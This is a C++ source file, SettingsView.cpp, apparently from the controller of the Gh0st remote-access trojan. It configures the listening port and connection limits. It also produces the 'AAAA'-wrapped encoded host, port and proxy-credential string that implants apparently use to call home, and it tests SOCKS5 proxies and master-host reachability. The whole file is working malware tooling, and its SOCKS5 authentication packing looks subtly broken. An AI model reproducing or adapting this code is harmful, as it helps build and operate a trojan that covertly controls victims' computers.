// SettingsView.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SettingsView.h"
#include "encode.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;


enum
{
	PROXY_NONE,
	PROXY_SOCKS_VER4 = 4,
	PROXY_SOCKS_VER5	
};

struct socks5req1
{
    char Ver;
    char nMethods;
    char Methods[2];
};

struct socks5ans1
{
    char Ver;
    char Method;
};

struct socks5req2
{
    char Ver;
    char Cmd;
    char Rsv;
    char Atyp;
    unsigned long IPAddr;
    unsigned short Port;
    
	//    char other[1];
};

struct socks5ans2
{
    char Ver;
    char Rep;
    char Rsv;
    char Atyp;
    char other[1];
};

struct authreq
{
    char Ver;
    char Ulen;
    char NamePass[256];
};

struct authans
{
    char Ver;
    char Status;
};
/////////////////////////////////////////////////////////////////////////////
// CSettingsView

IMPLEMENT_DYNCREATE(CSettingsView, CFormView)

CSettingsView::CSettingsView()
	: CFormView(CSettingsView::IDD)
{
	//{{AFX_DATA_INIT(CSettingsView)
	m_remote_host = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "Host", "");
	m_remote_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "Port", "80");
	m_encode = _T("");
	m_listen_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 80);
	m_max_connections = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection", 8000);
	m_connect_auto = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnectionAuto", 0);
	m_bIsProxyAuth = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Connection", "ProxyAuth", 0);
	m_bIsUsedProxy = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Connection", "UsedProxy", 0);
	m_proxy_host = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "ProxyHost");
	m_proxy_pass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "ProxyPass");
	m_proxy_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "ProxyPort", "1080");
	m_proxy_user = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "ProxyUser");
	m_bIsDisablePopTips = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", false);
	m_bFirstShow = true;
	m_bIsSaveAsDefault = FALSE;
	//}}AFX_DATA_INIT
}

CSettingsView::~CSettingsView()
{
}

void CSettingsView::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSettingsView)
	DDX_Text(pDX, IDC_REMOTE_HOST, m_remote_host);
	DDX_Text(pDX, IDC_REMOTE_PORT, m_remote_port);
	DDX_Text(pDX, IDC_ENCODE, m_encode);
	DDX_Text(pDX, IDC_LISTEN_PORT, m_listen_port);
	DDV_MinMaxUInt(pDX, m_listen_port, 1, 50000);
	DDX_Text(pDX, IDC_CONNECT_MAX, m_max_connections);
	DDV_MinMaxUInt(pDX, m_max_connections, 1, 100000);
	DDX_Check(pDX, IDC_CONNECT_AUTO, m_connect_auto);
	DDX_Check(pDX, IDC_CHECK_AUTH, m_bIsProxyAuth);
	DDX_Check(pDX, IDC_CHECK_PROXY, m_bIsUsedProxy);
	DDX_Text(pDX, IDC_PROXY_HOST, m_proxy_host);
	DDX_Text(pDX, IDC_PROXY_PASS, m_proxy_pass);
	DDX_Text(pDX, IDC_PROXY_PORT, m_proxy_port);
	DDX_Text(pDX, IDC_PROXY_USER, m_proxy_user);
	DDX_Check(pDX, IDC_DISABLE_POPTIPS, m_bIsDisablePopTips);
	DDX_Check(pDX, IDC_SAVEAS_DEFAULT, m_bIsSaveAsDefault);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSettingsView, CFormView)
	//{{AFX_MSG_MAP(CSettingsView)
	ON_CONTROL_RANGE(EN_CHANGE, IDC_REMOTE_HOST, IDC_PROXY_PASS, OnChangeConfig)
	ON_BN_CLICKED(IDC_RESETPORT, OnResetport)
	ON_BN_CLICKED(IDC_CONNECT_AUTO, OnConnectAuto)
	ON_BN_CLICKED(IDC_CHECK_AUTH, OnCheckAuth)
	ON_BN_CLICKED(IDC_TEST_PROXY, OnTestProxy)
	ON_BN_CLICKED(IDC_CHECK_PROXY, OnCheckProxy)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_BN_CLICKED(IDC_DISABLE_POPTIPS, OnDisablePoptips)
	ON_BN_CLICKED(IDC_SAVEAS_DEFAULT, OnSaveasDefault)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSettingsView diagnostics

#ifdef _DEBUG
void CSettingsView::AssertValid() const
{
	CFormView::AssertValid();
}

void CSettingsView::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CSettingsView message handlers

void CSettingsView::OnChangeConfig(UINT id)
{
	UpdateData();
	m_remote_host.Replace(" ", "");
	m_remote_port.Replace(" ", "");
	m_proxy_host.Replace(" ", "");
	m_proxy_port.Replace(" ", "");
	m_proxy_user.Replace(" ", "");
	m_proxy_pass.Replace(" ", "");

	CString str = m_remote_host + ":" + m_remote_port;

	if (m_bIsUsedProxy && m_proxy_host.GetLength() && m_proxy_port.GetLength())
	{
		str += "|" + m_proxy_host + ":" + m_proxy_port;
		if (m_bIsProxyAuth && m_proxy_user.GetLength() && m_proxy_pass.GetLength())
			str += "|" + m_proxy_user + ":" + m_proxy_pass;
	}
	str.MakeLower();
	m_encode = MyEncode(str.GetBuffer(0));
	m_encode.Insert(0, "AAAA");
	m_encode += "AAAA";
	UpdateData(FALSE);

	if (m_bIsSaveAsDefault)
	{
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "Host", m_remote_host);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "Port", m_remote_port);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "ProxyHost", m_proxy_host);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "ProxyPort", m_proxy_port);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "ProxyUser", m_proxy_user);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "ProxyPass", m_proxy_pass);	
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Connection", "UsedProxy", m_bIsUsedProxy);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Connection", "ProxyAuth", m_bIsProxyAuth);
	}
}

void CSettingsView::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
	// TODO: Add your specialized code here and/or call the base class

	if (m_bFirstShow)
	{
		if (m_remote_host.GetLength() == 0)
		{
			char hostname[256]; 
			gethostname(hostname, sizeof(hostname));
			HOSTENT *host = gethostbyname(hostname);
			if (host != NULL)
				m_remote_host = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
			else
				m_remote_host = _T("192.168.16.2");	
		}
		UpdateData(false);


		UpdateProxyControl();
		OnConnectAuto();

		// 更新字串
		OnChangeConfig(0);
		int	nEditControl[] = {IDC_LISTEN_PORT, IDC_CONNECT_MAX, IDC_REMOTE_HOST, IDC_REMOTE_PORT, 
			IDC_PROXY_HOST, IDC_PROXY_PORT, IDC_PROXY_USER, IDC_PROXY_PASS, IDC_ENCODE};
		for (int i = 0; i < sizeof(nEditControl) / sizeof(int); i++)
			m_Edit[i].SubclassDlgItem(nEditControl[i], this);

		int	nBtnControl[] = {IDC_RESETPORT, IDC_TEST_MASTER, IDC_TEST_PROXY};

		for (i = 0; i < sizeof(nBtnControl) / sizeof(int); i++)
		{
			m_Btn[i].SubclassDlgItem(nBtnControl[i], this);
			m_Btn[i].SetColor(CButtonST::BTNST_COLOR_FG_IN, RGB(255, 0, 0));
		}

 		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
 			SetDlgItemText(IDC_SYSTEM_TIPS, "找到IP数据库文件: QQWry.Dat");
 		else
 			SetDlgItemText(IDC_SYSTEM_TIPS, "没有找到IP数据库文件QQWry.Dat 请将此文件放至本程序同目录下以显示服务端地理位置");
	}

	m_bFirstShow = false;
	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}

void CSettingsView::OnResetport() 
{
	// TODO: Add your control notification handler code here
	int prev_port = m_listen_port;
	int prev_max_connections = m_max_connections;

	UpdateData(TRUE);

	if (prev_max_connections != m_max_connections)
	{
		if (m_connect_auto)
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, 8000);
		else
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
	}

	if (prev_port != m_listen_port)
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", m_max_connections);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);
}

void CSettingsView::OnConnectAuto() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
}

void CSettingsView::OnCheckAuth() 
{
	// TODO: Add your control notification handler code here
	UpdateProxyControl();
}

void CSettingsView::OnCheckProxy() 
{
	// TODO: Add your control notification handler code here
	UpdateProxyControl();
}


void CSettingsView::OnTestMaster() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	if (!m_remote_host.GetLength() || !m_remote_port.GetLength())
	{
		AfxMessageBox("请完整填服务器信息");
		return;
	}
	
	HANDLE	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, NULL);
	CloseHandle(hThread);
}

void CSettingsView::OnTestProxy() 
{
	// TODO: Add your control notification handler code here

	UpdateData();
	if (!m_proxy_host.GetLength() || !m_proxy_port.GetLength())
	{
		AfxMessageBox("请完整填写代理服务器信息");
		return;
	}

	HANDLE	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestProxy, this, 0, NULL);
	CloseHandle(hThread);
}


void CSettingsView::UpdateProxyControl()
{
	UpdateData();
	
	GetDlgItem(IDC_PROXY_HOST)->EnableWindow(m_bIsUsedProxy);
	GetDlgItem(IDC_PROXY_PORT)->EnableWindow(m_bIsUsedProxy);
	GetDlgItem(IDC_CHECK_AUTH)->EnableWindow(m_bIsUsedProxy);
	GetDlgItem(IDC_TEST_PROXY)->EnableWindow(m_bIsUsedProxy);
	
	GetDlgItem(IDC_PROXY_USER)->EnableWindow(m_bIsUsedProxy && m_bIsProxyAuth);
	GetDlgItem(IDC_PROXY_PASS)->EnableWindow(m_bIsUsedProxy && m_bIsProxyAuth);

	OnChangeConfig(0);
}

DWORD WINAPI CSettingsView::TestProxy( LPVOID lparam )
{
	CString str;

	CSettingsView	*pThis = (CSettingsView *)lparam;
	int	nRet = SOCKET_ERROR;
	WSADATA	wsaData;
	WSAStartup(0x0201, &wsaData);

	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		AfxMessageBox("socket 初始化失败");
		return false;
	}
	// 设置socket为非阻塞
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);

	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	fd_set fdRead;

	hostent* pHostent = NULL;
	pHostent = gethostbyname(pThis->m_proxy_host);
	if (pHostent == NULL)
	{
		nRet = SOCKET_ERROR;
		goto fail;
	}

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(atoi(pThis->m_proxy_port));
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));

	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		nRet = SOCKET_ERROR;
		goto fail;
	}
	// 设置socket为阻塞
	argp	= 0;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	char buff[600];

	struct socks5req1 m_proxyreq1;
	m_proxyreq1.Ver = PROXY_SOCKS_VER5;
	m_proxyreq1.nMethods = 2;
	m_proxyreq1.Methods[0] = 0;
	m_proxyreq1.Methods[1] = 2;
	send(sRemote, (char *)&m_proxyreq1, sizeof(m_proxyreq1), 0);
	
	FD_ZERO(&fdRead);
	FD_SET(sRemote, &fdRead);
	
	if (select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out) <= 0)
	{	
		nRet = SOCKET_ERROR;
		goto fail;
	}
	struct socks5ans1 *m_proxyans1;
	m_proxyans1 = (struct socks5ans1 *)buff;
	memset(buff, 0, sizeof(buff));
	recv(sRemote, buff, sizeof(buff), 0);

	if(m_proxyans1->Ver != 5 || (m_proxyans1->Method !=0 && m_proxyans1->Method != 2))
	{
		nRet = SOCKET_ERROR;
		goto fail;
	}	
	
 	if(m_proxyans1->Method == 0) // 不需要验证
 	{
 		nRet = 1;
 		goto fail;
 	}
	if(m_proxyans1->Method == 2 && (!pThis->m_bIsProxyAuth || !pThis->m_proxy_user.GetLength()))
	{
		nRet = 0;
		goto fail;
 	}

	if(m_proxyans1->Method == 2 && strlen(pThis->m_proxy_user) > 0)
	{
		int nUserLen = pThis->m_proxy_user.GetLength();
		int nPassLen = pThis->m_proxy_pass.GetLength();
		struct authreq m_authreq;
		memset(&m_authreq, 0, sizeof(m_authreq));
		m_authreq.Ver = PROXY_SOCKS_VER5;
		m_authreq.Ulen = nUserLen;
		lstrcpy(m_authreq.NamePass, pThis->m_proxy_user);
		memcpy(m_authreq.NamePass + nUserLen, &nPassLen, sizeof(int));
		lstrcpy(m_authreq.NamePass + nUserLen + 1, pThis->m_proxy_pass);
		
		int len = 3 + nUserLen + nPassLen;
		
		send(sRemote, (char *)&m_authreq, len, 0);
		
		struct authans *m_authans;
		m_authans = (struct authans *)buff;
		memset(buff, 0, sizeof(buff));
		
		FD_ZERO(&fdRead);
		FD_SET(sRemote, &fdRead);
		
		if (select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out) <= 0)
		{
			nRet = SOCKET_ERROR;
			goto fail;
		}
		
		recv(sRemote, buff, sizeof(buff), 0);
		if(m_authans->Ver != 5 || m_authans->Status != 0)
		{
			nRet = 0;
		}
		else
		{
			nRet = 1;
		}
	}
fail:

	closesocket(sRemote);
	WSACleanup();

	if (nRet == SOCKET_ERROR)
		AfxMessageBox("无法连接到代理服务器");
	else if (nRet == 0)
		AfxMessageBox("用户名/密码错误");
	else if (nRet == 1)	
		AfxMessageBox("代理服务器工作正常");
	return -1;
}

DWORD WINAPI CSettingsView::TestMaster( LPVOID lparam )
{
	CSettingsView	*pThis = (CSettingsView *)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData;
	WSAStartup(0x0201, &wsaData);

	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		AfxMessageBox("socket 初始化失败");
		return false;
	}
	// 设置socket为非阻塞
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);

	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;

	hostent* pHostent = NULL;
	pHostent = gethostbyname(pThis->m_remote_host);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(atoi(pThis->m_remote_port));
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));

	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
fail:
	closesocket(sRemote);
	WSACleanup();

	if (bRet)
		strResult.Format("成功打开到主机%s的连接， 在端口 %s: 连接成功", pThis->m_remote_host, pThis->m_remote_port);
	else
		strResult.Format("不能打开到主机%s的连接， 在端口 %s: 连接失败", pThis->m_remote_host, pThis->m_remote_port);
	AfxMessageBox(strResult);
	return -1;	
}

void CSettingsView::OnDisablePoptips() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "PopTips", m_bIsDisablePopTips);
	((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips = m_bIsDisablePopTips;
}

void CSettingsView::OnSaveasDefault() 
{
	// TODO: Add your control notification handler code here
	OnChangeConfig(0);
}
